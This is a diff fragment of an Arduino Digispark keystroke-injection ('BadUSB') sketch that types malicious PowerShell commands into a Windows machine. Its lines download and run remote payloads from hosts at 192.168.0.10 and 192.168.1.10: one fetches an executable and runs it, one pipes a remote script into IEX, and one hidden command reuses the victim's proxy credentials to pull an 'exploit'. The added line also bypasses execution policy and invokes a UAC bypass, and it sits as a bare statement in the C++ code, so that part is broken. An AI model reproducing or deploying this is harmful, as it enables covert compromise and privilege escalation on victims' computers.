@@ -42,7 +42,7 @@ void setup() {
   DigiKeyboard.println("Invoke-WebRequest -Uri '<url of payload>' -OutFile autoruns.exe; .\autoruns.exe")
   //powershell download and run in memory
   DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('<url of payload>') | IEX")\
-  //(New-Object System.Net.WebClient).DownloadString('http://192.168.0.10/kib_keyboard.ps1') | IEX
+  powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.10/kib_keyboard.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
   
   //deliver payload
   DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
